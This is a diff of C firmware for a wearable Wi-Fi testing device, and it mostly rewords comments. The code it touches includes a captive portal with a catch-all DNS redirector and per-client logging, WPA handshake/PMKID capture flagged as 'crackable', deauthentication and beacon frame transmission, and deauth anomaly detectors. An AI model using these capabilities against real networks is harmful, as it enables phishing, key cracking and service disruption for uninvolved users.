         bool owned = s_comp_owns_ap;
-        companion_stop();                             /* mDNS down + clear overrides (httpd already null) */
+        companion_stop();                             /* mDNS is down; clear the overrides too, since httpd is already null */
         if (owned) {
             do_ap_off();
         }
@@ -4618,15 +4818,16 @@ static void do_companion_on(void)
 static void do_companion_off(void)
 {
     bool owned = s_comp_owns_ap;
-    companion_stop();                                 /* drop HTTP + mDNS, clear overrides */
+    companion_stop();                                 /* drops HTTP and mDNS, clears the overrides */
     if (owned) {
-        do_ap_off();                                  /* tear the AP down + restore the STA link */
+        do_ap_off();                                  /* tears the AP down and restores the previous STA link */
     }
     refresh_strings();
 }
 
-/* Published companion state — LVGL-task-safe reads of worker-written state (single writer + the
- * s_comp_active flag as a barrier, mirroring the portal getters). */
+/* Published companion state — safe to read from the LVGL task, since
+ * it's written only by the worker with a single writer and the
+ * s_comp_active flag acting as a barrier, mirroring the portal getters. */
 bool        nocsif_wifi_companion_active(void)  { return s_comp_active; }
 const char *nocsif_wifi_companion_ssid(void)    { return s_comp_ssid; }
 const char *nocsif_wifi_companion_url(void)     { return s_mdns_up ? "nocsif.local" : (s_ap_ip[0] ? s_ap_ip : "nocsif.local"); }
@@ -4660,7 +4861,7 @@ const char *nocsif_wifi_companion_tag_str(void)
     return s;
 }
 
-/* ---- captive portal (M5-P5·4, active — authorized testing) --------------------------- */
+/* ---- captive portal (M5-P5.4, active — authorized testing) ---- */
 
 static const char PORTAL_DEFAULT_HTML[] =
     "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
@@ -4669,7 +4870,7 @@ static const char PORTAL_DEFAULT_HTML[] =
     "<p>You have joined a software access point used for authorized network testing.</p>"
     "<p>No action is required.</p></body></html>";
 
-/* Prime the selected landing-page filename from NVS once (idempotent). "" = the built-in notice. */
+/* Primes the selected landing-page filename from NVS once; safe to call more than once. "" means the built-in notice. */
 static void portal_sel_ensure_loaded(void)
 {
     if (s_portal_sel_loaded) {
@@ -4683,14 +4884,16 @@ static void portal_sel_ensure_loaded(void)
     portEXIT_CRITICAL(&s_portal_mux);
 }
 
-/* DNS redirector: answer every query with the AP's own IPv4 so a client's connectivity probe resolves
- * to the watch. Owns its socket (a short rx timeout lets it poll the run flag); closes + self-deletes
- * on stop. A single-question query is the common case; the answer is appended after the echoed query. */
+/* DNS redirector: answers every query with the AP's own IPv4, so a
+ * client's connectivity probe resolves right back to the watch. Owns its
+ * own socket, using a short rx timeout to poll the run flag periodically,
+ * and closes and self-deletes on stop. A single-question query is the
+ * common case; the answer is appended right after the echoed question. */
 static void portal_dns_task(void *arg)
 {
     (void)arg;
     int sock = s_dns_sock;
-    uint32_t apip = 0;                                  /* network-order AP IPv4 */
+    uint32_t apip = 0;                                  /* the AP's IPv4, in network order */
     esp_netif_ip_info_t ip;
     if (s_ap_netif && esp_netif_get_ip_info(s_ap_netif, &ip) == ESP_OK) {
         apip = ip.ip.addr;
@@ -4703,20 +4906,20 @@ static void portal_dns_task(void *arg)
         struct sockaddr_in cli;
         socklen_t cl = sizeof cli;
         int n = recvfrom(sock, buf, sizeof buf, 0, (struct sockaddr *)&cli, &cl);
-        if (n < 12 || n + 16 > (int)sizeof buf) {       /* timeout (-1) / runt / no room -> re-poll */
+        if (n < 12 || n + 16 > (int)sizeof buf) {       /* a timeout (-1), a runt packet, or no room to answer: re-poll */
             continue;
         }
-        buf[2] |= 0x80;                                 /* QR = response */
-        buf[3] = 0x00;                                  /* RA / RCODE cleared */
+        buf[2] |= 0x80;                                 /* QR bit: this is a response */
+        buf[3] = 0x00;                                  /* RA and RCODE cleared */
         buf[6] = 0x00; buf[7] = 0x01;                   /* ANCOUNT = 1 */
-        buf[8] = buf[9] = buf[10] = buf[11] = 0x00;     /* NSCOUNT / ARCOUNT = 0 */
-        int p = n;                                      /* append the answer after the echoed question */
-        buf[p++] = 0xC0; buf[p++] = 0x0C;               /* NAME -> pointer to the question (offset 12) */
+        buf[8] = buf[9] = buf[10] = buf[11] = 0x00;     /* NSCOUNT and ARCOUNT = 0 */
+        int p = n;                                      /* the answer is appended right after the echoed question */
+        buf[p++] = 0xC0; buf[p++] = 0x0C;               /* NAME: a pointer back to the question, at offset 12 */
         buf[p++] = 0x00; buf[p++] = 0x01;               /* TYPE A */
         buf[p++] = 0x00; buf[p++] = 0x01;               /* CLASS IN */
-        buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x3C;   /* TTL 60 s */
-        buf[p++] = 0x00; buf[p++] = 0x04;               /* RDLENGTH 4 */
-        memcpy(&buf[p], &apip, 4); p += 4;              /* RDATA = AP IPv4 */
+        buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x3C;   /* TTL: 60 seconds */
+        buf[p++] = 0x00; buf[p++] = 0x04;               /* RDLENGTH: 4 */
+        memcpy(&buf[p], &apip, 4); p += 4;              /* RDATA: the AP's IPv4 address */
         sendto(sock, buf, p, 0, (struct sockaddr *)&cli, cl);
     }
     close(sock);
@@ -4725,8 +4928,10 @@ static void portal_dns_task(void *arg)
     vTaskDeleteWithCaps(NULL);
 }
 
-/* Load the landing page from /sd once (httpd task; 8 KB stack fits FATFS). Also picks a fresh
- * portal-NNN.log name for this session. Best-effort — falls back to the built-in notice page. */
+/* Loads the landing page from /sd once, on the httpd task (its 8 KB
+ * stack has room for FATFS). Also picks a fresh portal-NNN.log name for
+ * this session. Best-effort — falls back to the built-in notice page on
+ * any failure. */
 static void portal_load_page_once(void)
 {
     bool go = false;
@@ -4742,7 +4947,7 @@ static void portal_load_page_once(void)
     mkdir("/sd/nocsif", 0777);
     mkdir("/sd/nocsif/wifi", 0777);
     mkdir(PORTAL_DIR, 0777);
-    for (int i = 0; i < 1000; i++) {                    /* first unused portal-NNN.log */
+    for (int i = 0; i < 1000; i++) {                    /* the first unused portal-NNN.log name */
         char pth[64];
         snprintf(pth, sizeof pth, "/sd/nocsif/wifi/portal-%03d.log", i);
         FILE *t = fopen(pth, "r");
@@ -4751,12 +4956,12 @@ static void portal_load_page_once(void)
         break;
     }
 
-    char sel[PT_SEL_MAX];                               /* the chosen page filename (copy off-lock) */
+    char sel[PT_SEL_MAX];                               /* the chosen page's filename, copied outside the lock */
     portENTER_CRITICAL(&s_portal_mux);
     memcpy(sel, s_portal_page_sel, sizeof sel);
     portEXIT_CRITICAL(&s_portal_mux);
 
-    if (sel[0]) {                                       /* "" -> serve the built-in notice */
+    if (sel[0]) {                                       /* "" means serve the built-in notice */
         char path[96];
         snprintf(path, sizeof path, "%s/%s", PORTAL_DIR, sel);
         FILE *f = fopen(path, "rb");
@@ -4780,12 +4985,12 @@ static void portal_load_page_once(void)
     nocsif_sdcard_unlock();
 }
 
-/* Record one client interaction: RAM ring (for the UI) + append to the session log on /sd. */
+/* Records one client interaction: into the RAM ring for the UI, and appended to the session log on /sd. */
 static void portal_log_request(httpd_req_t *req, const char *method, const char *extra)
 {
     char ips[16] = "?";
     int fd = httpd_req_to_sockfd(req);
-    struct sockaddr_in6 sa;                             /* buffer fits v4 + v6 */
+    struct sockaddr_in6 sa;                             /* the buffer fits both v4 and v6 */
     socklen_t sl = sizeof sa;
     if (getpeername(fd, (struct sockaddr *)&sa, &sl) == 0 && sa.sin6_family == AF_INET) {
         struct sockaddr_in *s4 = (struct sockaddr_in *)&sa;
@@ -4822,7 +5027,7 @@ static void portal_log_request(httpd_req_t *req, const char *method, const char 
     }
 }
 
-/* Wildcard handler: serve the landing page for every path (so client OSes surface the portal). */
+/* The wildcard handler: serves the landing page for every path, so client OSes surface the portal sheet. */
 static esp_err_t portal_http_req(httpd_req_t *req)
 {
     portal_load_page_once();
@@ -4853,9 +5058,9 @@ static void portal_stop(void)
     }
     s_portal_active = false;
 
-    if (s_httpd) { httpd_stop(s_httpd); s_httpd = NULL; }   /* joins the httpd task -> no more handlers */
+    if (s_httpd) { httpd_stop(s_httpd); s_httpd = NULL; }   /* joins the httpd task, so there are no more handler calls */
 
-    s_dns_run = false;                                      /* the DNS task exits within its rx timeout */
+    s_dns_run = false;                                      /* the DNS task exits within its own rx timeout */
     for (int i = 0; i < 20 && s_dns_task != NULL; i++) {
         vTaskDelay(pdMS_TO_TICKS(50));
     }
@@ -4875,7 +5080,7 @@ static void do_portal_on(void)
         return;
     }
     if (!s_ap_active) {
-        do_ap_on();                                     /* the portal rides on the open AP */
+        do_ap_on();                                     /* the portal rides on top of the open AP */
     }
     if (!s_ap_active) {
         ESP_LOGW(TAG, "portal: AP did not start");
@@ -4883,7 +5088,7 @@ static void do_portal_on(void)
     }
     portal_sel_ensure_loaded();
 
-    s_portal_hits = 0;                                  /* fresh session */
+    s_portal_hits = 0;                                  /* a fresh session */
     s_portal_page = NULL;
     s_portal_page_len = 0;
     s_portal_page_tried = false;
@@ -4893,7 +5098,7 @@ static void do_portal_on(void)
     portEXIT_CRITICAL(&s_portal_mux);
     s_portal_gen++;
 
-    s_portal_sd_ok = (nocsif_usb_gadget_claim_sd(1500) == ESP_OK);   /* page + log (best-effort) */
+    s_portal_sd_ok = (nocsif_usb_gadget_claim_sd(1500) == ESP_OK);   /* the page and log, best-effort */
 
     s_dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (s_dns_sock >= 0) {
@@ -4929,7 +5134,7 @@ static void do_portal_on(void)
         ESP_LOGE(TAG, "portal: httpd_start failed");
     }
 
-    if (s_httpd == NULL) {                               /* HTTP is mandatory; roll the session back */
+    if (s_httpd == NULL) {                               /* HTTP is mandatory: roll the session back */
         portal_stop();
         publish_status("err");
         publish_detail("Portal failed to start.");
@@ -4949,8 +5154,10 @@ static void do_portal_off(void)
     refresh_strings();
 }
 
-/* Re-serve a newly-selected landing page on a running portal: a clean stop→start on the worker (the AP
- * stays up). A no-op if the portal is not active — the new selection just applies at the next Start. */
+/* Re-serves a newly selected landing page on an already-running
+ * portal: a clean stop then start on the worker, with the AP itself
+ * staying up. A no-op if the portal isn't active — the new selection just
+ * applies at the next Start. */
 static void do_portal_reload(void)
 {
     if (!s_portal_active) {
@@ -4960,7 +5167,7 @@ static void do_portal_reload(void)
     do_portal_on();
 }
 
-/* ---- monitor published getters (RAM/volatile; LVGL-task-safe) ---------------------- */
+/* ---- monitor's published getters: RAM/volatile, safe on the LVGL task ---- */
 bool     nocsif_wifi_monitor_active(void)    { return s_mon_active; }
 bool     nocsif_wifi_monitor_hopping(void)   { return s_mon_hop; }
 int      nocsif_wifi_monitor_channel(void)   { return s_mon_chan; }
@@ -4999,7 +5206,7 @@ const char *nocsif_wifi_monitor_tag_str(void)
     return buf;
 }
 
-/* ---- passive parser getters (M5-P3; snapshot copies, LVGL-task-safe) --------------- */
+/* ---- passive parser getters (M5-P3): snapshot copies, safe on the LVGL task ---- */
 bool     nocsif_wifi_parse_active(void)  { return s_parse_active; }
 int      nocsif_wifi_mon_ap_count(void)  { return s_mon_ap_cnt; }
 uint32_t nocsif_wifi_mon_ap_gen(void)    { return s_mon_ap_gen; }
@@ -5014,7 +5221,7 @@ bool nocsif_wifi_mon_ap_get(int idx, nocsif_wifi_mon_ap_t *out)
     portENTER_CRITICAL(&s_ap_mux);
     ok = (idx >= 0 && idx < s_mon_ap_cnt && s_mon_ap[idx].used);
     if (ok) {
-        tmp = s_mon_ap[idx];                          /* whole-struct copy under the lock */
+        tmp = s_mon_ap[idx];                          /* a whole-struct copy under the lock */
     }
     portEXIT_CRITICAL(&s_ap_mux);
     if (!ok) {
@@ -5055,7 +5262,7 @@ const char *nocsif_wifi_mon_ap_tag_str(void)
     return buf;
 }
 
-/* ---- station list getters (M5-P3·2; snapshot copies, LVGL-task-safe) ---------------- */
+/* ---- station list getters (M5-P3.2): snapshot copies, safe on the LVGL task ---- */
 int      nocsif_wifi_mon_sta_count(void) { return s_mon_sta_cnt; }
 uint32_t nocsif_wifi_mon_sta_gen(void)   { return s_mon_sta_gen; }
 
@@ -5070,8 +5277,8 @@ bool nocsif_wifi_mon_sta_get(int idx, nocsif_wifi_mon_sta_t *out)
     portENTER_CRITICAL(&s_ap_mux);
     ok = (idx >= 0 && idx < s_mon_sta_cnt && s_mon_sta[idx].used);
     if (ok) {
-        tmp = s_mon_sta[idx];                         /* whole-struct copy under the lock */
-        for (int i = 0; i < s_mon_ap_cnt; i++) {      /* resolve the AP's SSID by BSSID */
+        tmp = s_mon_sta[idx];                         /* a whole-struct copy under the lock */
+        for (int i = 0; i < s_mon_ap_cnt; i++) {      /* resolves the AP's SSID by its BSSID */
             if (s_mon_ap[i].used && memcmp(s_mon_ap[i].bssid, tmp.bssid, 6) == 0) {
                 memcpy(ssid, s_mon_ap[i].ssid, sizeof ssid);
                 break;
@@ -5104,7 +5311,7 @@ const char *nocsif_wifi_mon_sta_tag_str(void)
     return buf;
 }
 
-/* ---- probe-request getters (M5-P3·2; snapshot copies, LVGL-task-safe) --------------- */
+/* ---- probe-request getters (M5-P3.2): snapshot copies, safe on the LVGL task ---- */
 int      nocsif_wifi_mon_probe_count(void) { return s_mon_probe_cnt; }
 uint32_t nocsif_wifi_mon_probe_gen(void)   { return s_mon_probe_gen; }
 
@@ -5144,7 +5351,7 @@ const char *nocsif_wifi_mon_probe_tag_str(void)
     return buf;
 }
 
-/* ---- key-exchange getters (M5-P4·1; snapshot copies, LVGL-task-safe) ---------------- */
+/* ---- key-exchange getters (M5-P4.1): snapshot copies, safe on the LVGL task ---- */
 int      nocsif_wifi_mon_hs_count(void) { return s_mon_hs_cnt; }
 uint32_t nocsif_wifi_mon_hs_gen(void)   { return s_mon_hs_gen; }
 
@@ -5159,8 +5366,8 @@ bool nocsif_wifi_mon_hs_get(int idx, nocsif_wifi_mon_hs_t *out)
     portENTER_CRITICAL(&s_ap_mux);
     ok = (idx >= 0 && idx < s_mon_hs_cnt && s_mon_hs[idx].used);
     if (ok) {
-        tmp = s_mon_hs[idx];                          /* whole-struct copy under the lock */
-        for (int i = 0; i < s_mon_ap_cnt; i++) {      /* resolve the AP's SSID by BSSID */
+        tmp = s_mon_hs[idx];                          /* a whole-struct copy under the lock */
+        for (int i = 0; i < s_mon_ap_cnt; i++) {      /* resolves the AP's SSID by its BSSID */
             if (s_mon_ap[i].used && memcmp(s_mon_ap[i].bssid, tmp.bssid, 6) == 0) {
                 memcpy(ssid, s_mon_ap[i].ssid, sizeof ssid);
                 break;
@@ -5200,12 +5407,12 @@ bool nocsif_wifi_hs_crackable(const nocsif_wifi_mon_hs_t *hs)
         return false;
     }
     if (hs->has_pmkid) {
-        return true;                                  /* PMKID alone is enough */
+        return true;                                  /* a PMKID alone is already enough */
     }
-    return (hs->msg_mask & 0x03) == 0x03;             /* msg1 + msg2: the pair the offline check needs */
+    return (hs->msg_mask & 0x03) == 0x03;             /* message 1 plus message 2: the pair the offline check needs */
 }
 
-/* ---- anomaly detectors (M5-P4·2; RAM/volatile + AP-table snapshot, LVGL-task-safe) --- */
+/* ---- anomaly detectors (M5-P4.2): RAM/volatile plus an AP-table snapshot, safe on the LVGL task ---- */
 uint32_t nocsif_wifi_deauth_count(void)     { return s_mon_deauth; }
 uint32_t nocsif_wifi_disassoc_count(void)   { return s_mon_disassoc; }
 uint32_t nocsif_wifi_deauth_rate(void)      { return s_mon_dd_rate; }
@@ -5218,7 +5425,7 @@ const char *nocsif_wifi_anomaly_tag_str(void)
         return "off";
     }
     if (s_mon_dd_rate > 0) {
-        snprintf(buf, sizeof buf, "%u/s", (unsigned)s_mon_dd_rate);   /* live deauth/disassoc rate */
+        snprintf(buf, sizeof buf, "%u/s", (unsigned)s_mon_dd_rate);   /* the live deauth/disassoc rate */
         return buf;
     }
     return "ok";
@@ -5229,9 +5436,11 @@ int nocsif_wifi_mon_dup_snapshot(nocsif_wifi_mon_dup_t *arr, int max)
     if (arr == NULL || max < 0) {
         return 0;
     }
-    /* Copy (SSID, security) out of the AP table under the lock, then group off-lock so the short
-     * spinlock never spans the O(n^2) compare. Each AP entry is a DISTINCT BSSID (the table is
-     * BSSID-keyed), so counting same-SSID entries counts the distinct BSSIDs advertising it. */
+    /* Copies (SSID, security) pairs out of the AP table under the lock,
+     * then groups them outside the lock, so the short spinlock is never held
+     * across the O(n^2) comparison. Each AP entry is a distinct BSSID (the
+     * table is keyed by BSSID), so counting entries with the same SSID is
+     * counting the distinct BSSIDs advertising it. */
     struct { char ssid[WIFI_SSID_MAX]; uint8_t sec; } snap[MON_AP_MAX];
     int cnt = 0;
     portENTER_CRITICAL(&s_ap_mux);
@@ -5262,7 +5471,7 @@ int nocsif_wifi_mon_dup_snapshot(nocsif_wifi_mon_dup_t *arr, int max)
                 if (snap[j].sec == NOCSIF_WIFI_SEC_OPEN) open = true;
             }
         }
-        if (n >= 2) {                                  /* an SSID on 2+ BSSIDs — report the group */
+        if (n >= 2) {                                  /* an SSID seen on 2 or more BSSIDs: report the group */
             if (groups < max) {
                 nocsif_wifi_mon_dup_t *d = &arr[groups];
                 snprintf(d->ssid, sizeof d->ssid, "%s", snap[i].ssid);
@@ -5278,7 +5487,7 @@ int nocsif_wifi_mon_dup_snapshot(nocsif_wifi_mon_dup_t *arr, int max)
     return groups;
 }
 
-/* ---- PCAP getters (M5-P3·3; RAM/volatile, LVGL-task-safe) --------------------------- */
+/* ---- PCAP getters (M5-P3.3): RAM/volatile, safe on the LVGL task ---- */
 bool     nocsif_wifi_pcap_active(void)  { return s_pcap_active; }
 uint32_t nocsif_wifi_pcap_frames(void)  { return s_pcap_frames; }
 uint32_t nocsif_wifi_pcap_bytes(void)   { return s_pcap_bytes; }
@@ -5339,15 +5548,16 @@ static void wifi_task(void *arg)
         case CMD_PCAP_STREAM_ON:  do_pcap_stream_on();  break;
         case CMD_PCAP_STREAM_OFF: do_pcap_stream_off(); break;
         case CMD_HS_ON:         do_hs_capture_on(); break;
-        case CMD_HS_OFF:        do_pcap_off(); break;   /* shared writer stop */
+        case CMD_HS_OFF:        do_pcap_off(); break;   /* stops the shared writer */
         case CMD_MGMTTX_ON:     do_mgmt_tx_on(); break;
         case CMD_MGMTTX_OFF:    do_mgmt_tx_off(); break;
         case CMD_MGMTTX_TARGET: do_mgmt_tx_target(c.mac, (int)c.arg, c.ssid); break;
         case CMD_BEACON_ON:     do_beacon_on(); break;
         case CMD_BEACON_OFF:    do_beacon_off(); break;
         case CMD_EXPORT_HC:     do_export_hc(); break;
-        /* §4.8a: the software AP + portal are mutually exclusive with the companion surface (which owns
-         * port 80) — fully cycle companion off first, then clear its SSID override. */
+        /* Section 4.8a: the software AP and portal are mutually exclusive
+         * with the companion surface, since it owns port 80 too — fully cycle
+         * companion off first, then clear its SSID override. */
         case CMD_AP_ON:         if (s_comp_active) do_companion_off(); s_ap_ssid_ov[0] = '\0'; do_ap_on(); break;
         case CMD_AP_OFF:        do_ap_off(); break;
         case CMD_PORTAL_ON:     if (s_comp_active) do_companion_off(); s_ap_ssid_ov[0] = '\0'; do_portal_on(); break;
@@ -5357,12 +5567,12 @@ static void wifi_task(void *arg)
         case CMD_COMPANION_OFF: do_companion_off(); break;
         case CMD_LEAN_ON:       do_lean_set(true);  break;
         case CMD_LEAN_OFF:      do_lean_set(false); break;
-        case CMD_GEO_STAMP:     do_geo_stamp(c.arg, c.arg2); break;   /* §4.6 P3 */
+        case CMD_GEO_STAMP:     do_geo_stamp(c.arg, c.arg2); break;   /* section 4.6 P3 */
         }
     }
 }
 
-/* ---- public API ------------------------------------------------------------------- */
+/* ---- public API ---- */
 static void post(wifi_cmd_type_t type, const char *ssid, const char *pass)
 {
     if (s_q == NULL) {
@@ -5371,7 +5581,7 @@ static void post(wifi_cmd_type_t type, const char *ssid, const char *pass)
     wifi_cmd_t c = { .type = type };
     if (ssid) { snprintf(c.ssid, sizeof c.ssid, "%s", ssid); }
     if (pass) { snprintf(c.pass, sizeof c.pass, "%s", pass); }
-    xQueueSend(s_q, &c, 0);     /* non-blocking; a full queue drops the request (UI retries) */
+    xQueueSend(s_q, &c, 0);     /* non-blocking; a full queue just drops the request, and the UI retries */
 }
 
 void nocsif_wifi_request_geo_stamp(int32_t lat_ud, int32_t lon_ud)
@@ -5380,7 +5590,7 @@ void nocsif_wifi_request_geo_stamp(int32_t lat_ud, int32_t lon_ud)
         return;
     }
     wifi_cmd_t c = { .type = CMD_GEO_STAMP, .arg = lat_ud, .arg2 = lon_ud };
-    xQueueSend(s_q, &c, 0);     /* non-blocking; a dropped stamp is re-offered on the next fresh fix */
+    xQueueSend(s_q, &c, 0);     /* non-blocking; a dropped stamp gets re-offered on the next fresh fix */
 }
 
 static void post_mac(const uint8_t mac[6])
@@ -5393,7 +5603,7 @@ static void post_mac(const uint8_t mac[6])
     xQueueSend(s_q, &c, 0);
 }
 
-/* Post the management-frame TX target (BSSID in mac, channel in arg, SSID in ssid). */
+/* Posts the management-frame TX target: BSSID in `mac`, channel in `arg`, SSID in `ssid`. */
 static void post_target(const uint8_t bssid[6], int channel, const char *ssid)
 {
     if (s_q == NULL) {
@@ -5417,22 +5627,22 @@ static void post_i(wifi_cmd_type_t type, int32_t arg)
 esp_err_t nocsif_wifi_init(void)
 {
     if (s_task != NULL) {
-        return ESP_OK;          /* idempotent */
+        return ESP_OK;          /* safe to call more than once */
     }
     if (nocsif_reliability_safe_mode()) {
         publish_status("off");
         publish_detail("WiFi disabled (safe mode).");
         ESP_LOGW(TAG, "safe mode — WiFi bring-up skipped");
-        return ESP_OK;          /* no task; nocsif_wifi_available() stays false */
+        return ESP_OK;          /* no task exists, so nocsif_wifi_available() stays false */
     }
 
-    load_creds();               /* prime the RAM cache before any getter runs */
-    load_saved();               /* prime the saved-profile list (migrates the legacy slot) */
-    ap_cfg_ensure_loaded();     /* prime the software-AP config (SSID/channel/hidden) */
-    s_autojoin = nocsif_settings_get_i32(K_AUTOJOIN, 1) != 0;   /* default: auto-join on */
+    load_creds();               /* primes the RAM cache before any getter runs */
+    load_saved();               /* primes the saved-profile list, migrating the legacy slot if needed */
+    ap_cfg_ensure_loaded();     /* primes the software-AP config: SSID, channel, hidden flag */
+    s_autojoin = nocsif_settings_get_i32(K_AUTOJOIN, 1) != 0;   /* the default is auto-join on */
     if (esp_read_mac(s_mac_factory, ESP_MAC_WIFI_STA) == ESP_OK) {
         s_mac_factory_ok = true;
-        char s[18];             /* show the factory MAC before the radio is even brought up */
+        char s[18];             /* shows the factory MAC even before the radio is actually brought up */
         format_mac(s, sizeof s, s_mac_factory);
         publish_mac_str(s);
     }
@@ -5445,8 +5655,9 @@ esp_err_t nocsif_wifi_init(void)
         ESP_LOGE(TAG, "failed to create command queue");
         return ESP_ERR_NO_MEM;
     }
-    /* Priority below the UI/system tasks; the event handlers do the reactive work, so the
-     * worker mostly blocks on the queue. Not Task-WDT-subscribed (no unbounded spin). */
+    /* Priority is below the UI/system tasks; the event handlers do the
+     * reactive work, so the worker mostly just blocks on its queue. Not
+     * subscribed to the task watchdog, since there's no unbounded spin here. */
     if (xTaskCreate(wifi_task, "wifi", 4096, NULL, 4, &s_task) != pdPASS) {
         ESP_LOGE(TAG, "failed to create wifi worker task");
         vQueueDelete(s_q);
@@ -5461,8 +5672,10 @@ esp_err_t nocsif_wifi_init(void)
 void nocsif_wifi_request_enable(bool on)      { post(on ? CMD_ENABLE : CMD_DISABLE, NULL, NULL); }
 void nocsif_wifi_set_lean(bool lean)
 {
-    /* Before the worker exists (main.c arms this at boot, ahead of nocsif_wifi_init, so WiFi comes up
-     * lean from the very first init) set the flag directly — post() would drop it on the NULL queue. */
+    /* Before the worker even exists — main.c arms this at boot, ahead of
+     * nocsif_wifi_init, so WiFi comes up lean from its very first init — the
+     * flag is set directly, since post() would just drop it on the NULL
+     * queue. */
     if (s_q == NULL) {
         s_lean = lean;
         return;
@@ -5473,7 +5686,7 @@ bool nocsif_wifi_is_lean(void)                { return s_lean; }
 void nocsif_wifi_request_scan(void)           { post(CMD_SCAN, NULL, NULL); }
 void nocsif_wifi_request_connect(const char *ssid, const char *pass)
 {
-    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflect "joining" the instant the UI asks */
+    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflects "joining" the instant the UI asks */
     post(CMD_CONNECT, ssid, pass);
 }
 void nocsif_wifi_request_disconnect(void)     { post(CMD_DISCONNECT, NULL, NULL); }
@@ -5481,7 +5694,7 @@ void nocsif_wifi_request_forget(void)         { post(CMD_FORGET, NULL, NULL); }
 
 void nocsif_wifi_request_reconnect(void)
 {
-    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflect "joining" the instant the UI asks */
+    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflects "joining" the instant the UI asks */
     post(CMD_RECONNECT, NULL, NULL);
 }
 void nocsif_wifi_request_randomize_mac(void)  { post(CMD_RANDMAC, NULL, NULL); }
@@ -5491,7 +5704,7 @@ void nocsif_wifi_request_set_mac(const uint8_t mac[6]) { if (mac) post_mac(mac);
 void nocsif_wifi_forget_ssid(const char *ssid)         { post(CMD_FORGET_SSID, ssid, NULL); }
 void nocsif_wifi_connect_saved(const char *ssid)
 {
-    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflect "joining" the instant the UI asks */
+    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflects "joining" the instant the UI asks */
     post(CMD_CONNECT_SAVED, ssid, NULL);
 }
 
@@ -5502,20 +5715,20 @@ void nocsif_wifi_set_autojoin(bool on)
     ESP_LOGI(TAG, "auto-join %s", on ? "on" : "off");
 }
 
-/* ---- monitor mode requests (M5-P2) ------------------------------------------------- */
+/* ---- monitor mode requests (M5-P2) ---- */
 void nocsif_wifi_request_monitor(bool on)          { post(on ? CMD_MONITOR_ON : CMD_MONITOR_OFF, NULL, NULL); }
 void nocsif_wifi_request_monitor_hop(bool hop)     { post_i(CMD_MON_HOP, hop ? 1 : 0); }
 void nocsif_wifi_request_monitor_channel(int ch)   { post_i(CMD_MON_CHAN, ch); }
 
-/* ---- passive parser request (M5-P3) ------------------------------------------------ */
+/* ---- passive parser request (M5-P3) ---- */
 void nocsif_wifi_request_parse(bool on)            { post(on ? CMD_PARSE_ON : CMD_PARSE_OFF, NULL, NULL); }
 
-/* ---- PCAP capture request (M5-P3·3) ------------------------------------------------- */
+/* ---- PCAP capture request (M5-P3.3) ---- */
 void nocsif_wifi_request_pcap(bool on)             { post(on ? CMD_PCAP_ON : CMD_PCAP_OFF, NULL, NULL); }
 void nocsif_wifi_request_pcap_stream(bool on)      { post(on ? CMD_PCAP_STREAM_ON : CMD_PCAP_STREAM_OFF, NULL, NULL); }
 void nocsif_wifi_request_hs_capture(bool on)       { post(on ? CMD_HS_ON : CMD_HS_OFF, NULL, NULL); }
 
-/* ---- management-frame TX requests + state (M5-P5·1, active) ------------------------- */
+/* ---- management-frame TX requests and state (M5-P5.1, active) ---- */
 void nocsif_wifi_request_mgmt_tx(bool on)          { post(on ? CMD_MGMTTX_ON : CMD_MGMTTX_OFF, NULL, NULL); }
 void nocsif_wifi_set_mgmt_target(const uint8_t bssid[6], int channel, const char *ssid) { post_target(bssid, channel, ssid); }
 void nocsif_wifi_set_mgmt_disassoc(bool disassoc)  { s_tx_disassoc = disassoc; }
@@ -5548,7 +5761,7 @@ const char *nocsif_wifi_mgmt_tx_tag_str(void)
     return s_tx_have_target ? "armed" : "off";
 }
 
-/* ---- beacon TX requests + state (M5-P5·2, active; list API is defined with the beacon TX code) -- */
+/* ---- beacon TX requests and state (M5-P5.2, active; the list API is defined alongside the beacon TX code) ---- */
 void nocsif_wifi_request_beacon(bool on)           { post(on ? CMD_BEACON_ON : CMD_BEACON_OFF, NULL, NULL); }
 bool nocsif_wifi_beacon_active(void)               { return s_bcn_active; }
 uint32_t nocsif_wifi_beacon_frames(void)           { return s_bcn_frames; }
@@ -5564,7 +5777,7 @@ const char *nocsif_wifi_beacon_tag_str(void)
     return s_bcn_cnt > 0 ? "ready" : "off";
 }
 
-/* ---- software AP requests + config + state (M5-P5·3, active) ------------------------ */
+/* ---- software AP requests, config, and state (M5-P5.3, active) ---- */
 void nocsif_wifi_request_ap(bool on) { post(on ? CMD_AP_ON : CMD_AP_OFF, NULL, NULL); }
 
 void nocsif_wifi_ap_set_ssid(const char *ssid)
@@ -5574,12 +5787,12 @@ void nocsif_wifi_ap_set_ssid(const char *ssid)
         return;
     }
     char clean[WIFI_SSID_MAX];
-    snprintf(clean, sizeof clean, "%s", ssid);        /* truncates to 32 chars */
+    snprintf(clean, sizeof clean, "%s", ssid);        /* truncates to 32 characters */
     portENTER_CRITICAL(&s_sap_mux);
     memcpy(s_ap_ssid, clean, sizeof clean);
     portEXIT_CRITICAL(&s_sap_mux);
     nocsif_settings_set_str(K_AP_SSID, clean);
-    if (s_ap_active) { post(CMD_AP_ON, NULL, NULL); } /* re-apply live */
+    if (s_ap_active) { post(CMD_AP_ON, NULL, NULL); } /* re-applies live */
 }
 
 void nocsif_wifi_ap_set_channel(int channel)
@@ -5609,7 +5822,7 @@ uint32_t    nocsif_wifi_ap_gen(void)     { return s_ap_cli_gen; }
 const char *nocsif_wifi_ap_ssid(void)
 {
     ap_cfg_ensure_loaded();
-    return s_ap_ssid;   /* module-owned; setter writes are ≤33 bytes (display-only read) */
+    return s_ap_ssid;   /* module-owned; setter writes are at most 33 bytes, display-only for reading */
 }
 
 int nocsif_wifi_ap_client_count(void)
@@ -5620,7 +5833,7 @@ int nocsif_wifi_ap_client_count(void)
 
 bool nocsif_wifi_ap_client_get(int idx, uint8_t mac[6], char *ip, size_t iplen, int8_t *rssi)
 {
-    int i = s_ap_cli_i;                 /* read the published buffer lock-free */
+    int i = s_ap_cli_i;                 /* reads the published buffer lock-free */
